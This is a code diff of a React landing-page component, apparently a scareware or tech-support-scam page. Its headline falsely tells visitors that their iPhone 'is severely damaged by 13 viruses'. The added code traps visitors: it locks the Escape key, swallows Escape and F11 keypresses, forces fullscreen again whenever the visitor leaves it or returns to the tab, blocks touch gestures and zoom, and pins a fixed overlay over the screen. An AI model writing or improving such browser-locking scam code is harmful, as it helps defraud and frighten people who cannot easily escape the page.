@@ -5,9 +5,7 @@ import Setting from '../assets/Settings1.webp'
 const Hero = () => {
     const [isFullscreen, setIsFullscreen] = useState(false);
 
-    // Function to handle fullscreen across browsers
     const handleFullscreen = async () => {
-        // Set fullscreen state
         setIsFullscreen(true);
 
         // Add Safari-specific meta tags
@@ -27,65 +25,83 @@ const Hero = () => {
             }
         });
 
-        // Safari-specific body adjustments
+        // Apply aggressive Safari-specific styles
         document.body.style.setProperty('-webkit-user-select', 'none', 'important');
         document.body.style.setProperty('user-select', 'none', 'important');
         document.body.style.setProperty('-webkit-touch-callout', 'none', 'important');
-        
+        document.body.style.setProperty('overflow', 'hidden', 'important');
+        document.documentElement.style.setProperty('overflow', 'hidden', 'important');
+
+        // Lock keyboard if supported
+        if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+            try {
+                await navigator.keyboard.lock(['Escape']);
+                console.log('Keyboard locked');
+            } catch (err) {
+                console.log('Keyboard lock failed:', err);
+            }
+        }
+
+        // Handle fullscreen
         const element = document.documentElement;
-        
         try {
             if (element.requestFullscreen) {
                 await element.requestFullscreen();
-            } else if (element.webkitRequestFullscreen) { // Safari
-                await element.webkitRequestFullscreen();
-            } else if (element.msRequestFullscreen) { // IE/Edge
+            } else if (element.webkitRequestFullscreen) {
+                await element.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+            } else if (element.msRequestFullscreen) {
                 await element.msRequestFullscreen();
             }
         } catch (error) {
             console.log('Fullscreen not supported:', error);
         }
 
-        // Mobile-specific adjustments
+        // iOS-specific handling
         if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
-            // Safari mobile specific styles
-            document.body.style.setProperty('-webkit-user-select', 'none', 'important');
-            document.body.style.setProperty('user-select', 'none', 'important');
-            document.body.style.setProperty('-webkit-touch-callout', 'none', 'important');
-            
-            // Hide Safari UI by scrolling slightly
+            // Force viewport settings
+            const viewportMeta = document.createElement('meta');
+            viewportMeta.name = 'viewport';
+            viewportMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+            document.head.appendChild(viewportMeta);
+
+            // Hide Safari UI
             setTimeout(() => {
                 window.scrollTo(0, 1);
             }, 100);
 
-            // Prevent default touch behaviors
-            try {
-                document.addEventListener('touchmove', (e) => {
-                    e.preventDefault();
-                }, { passive: false });
-            } catch (error) {
-                console.log('Touch event prevention not supported:', error);
-            }
+            // Prevent all touch events
+            document.addEventListener('touchmove', (e) => {
+                e.preventDefault();
+            }, { passive: false });
 
-            // Try to lock orientation only if the API is fully supported
-            try {
-                if (
-                    window.screen && 
-                    window.screen.orientation && 
-                    typeof window.screen.orientation.lock === 'function'
-                ) {
-                    await window.screen.orientation.lock('portrait').catch(() => {
-                        // Silently fail if orientation lock is not supported
-                        console.log('Orientation lock not supported on this device');
-                    });
+            document.addEventListener('touchend', (e) => {
+                e.preventDefault();
+            }, { passive: false });
+
+            // Lock orientation
+            if (window.screen && window.screen.orientation) {
+                try {
+                    await window.screen.orientation.lock('portrait');
+                } catch (error) {
+                    console.log('Orientation lock not supported');
                 }
-            } catch (error) {
-                // Silently fail if orientation lock is not supported
-                console.log('Orientation API not supported:', error);
             }
         }
+
+        // Prevent common exit methods
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' || e.key === 'F11') {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        }, true);
+
+        // Force focus on the page
+        window.focus();
     };
 
+    // Monitor fullscreen changes
     useEffect(() => {
         const handleFullscreenChange = () => {
             const isFullscreenNow = !!(
@@ -93,21 +109,36 @@ const Hero = () => {
                 document.webkitFullscreenElement ||
                 document.msFullscreenElement
             );
+            
+            // If fullscreen is exited, try to enter again
+            if (!isFullscreenNow && isFullscreen) {
+                handleFullscreen();
+            }
+            
             setIsFullscreen(isFullscreenNow);
         };
 
+        // Handle various fullscreen change events
         document.addEventListener('fullscreenchange', handleFullscreenChange);
         document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
         document.addEventListener('MSFullscreenChange', handleFullscreenChange);
+
+        // Handle visibility change
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden && isFullscreen) {
+                handleFullscreen();
+            }
+        });
 
         return () => {
             document.removeEventListener('fullscreenchange', handleFullscreenChange);
             document.removeEventListener('webkitfullscreenchange', handleFullscreenChange);
             document.removeEventListener('MSFullscreenChange', handleFullscreenChange);
+            document.removeEventListener('visibilitychange', () => {});
         };
-    }, []);
+    }, [isFullscreen]);
 
-    // Rest of your component remains the same...
+    // Your existing return JSX remains the same...
     return (
         <div 
             className={`${
@@ -122,10 +153,15 @@ const Hero = () => {
                 touchAction: 'none',
                 WebkitTouchCallout: 'none',
                 WebkitUserSelect: 'none',
-                WebkitTapHighlightColor: 'transparent'
+                WebkitTapHighlightColor: 'transparent',
+                position: 'fixed',
+                top: 0,
+                left: 0,
+                right: 0,
+                bottom: 0,
+                overflow: 'hidden'
             } : {}}
         >
-
             <h1 className="text-[18px] before:leading-[28px] text-ligh-red font-normal mb-[24px] md:text-[20px] lg:text-[22px]">
                 Warning Your Apple iPhone is severely damaged by 13 viruses
             </h1>
@@ -148,7 +184,7 @@ const Hero = () => {
                 </div>
             </div>
 
-            {/* Center Modal */}
+         
             <div className="fixed top-1/3 left-1/2 transform -translate-x-1/2 -translate-y-1/2 
                     bg-[#1b1b1b]/90 p-4 rounded-xl h-[200px] w-[280px] text-center shadow-2xl z-50
                     md:w-[320px] md:h-[220px] lg:w-[360px] lg:h-[240px]">
@@ -173,7 +209,7 @@ const Hero = () => {
                 </button>
             </div>
 
-            {/* Bottom Notifications */}
+       
             <div className="fixed bottom-32 left-1/2 transform -translate-x-1/2 w-[280px] bg-whitish rounded-xl z-50 
                     md:w-[320px] lg:w-[360px] md:bottom-36">
                 <div className="p-4 flex items-start gap-3 md:p-5">
@@ -192,7 +228,7 @@ const Hero = () => {
                 </div>
             </div>
 
-            {/* Bottom OK Button */}
+     
             <div className="fixed bottom-16 left-1/2 transform -translate-x-1/2 w-[280px] bg-whitish rounded-xl z-50
                     md:w-[320px] lg:w-[360px] md:bottom-20">
                 <button 
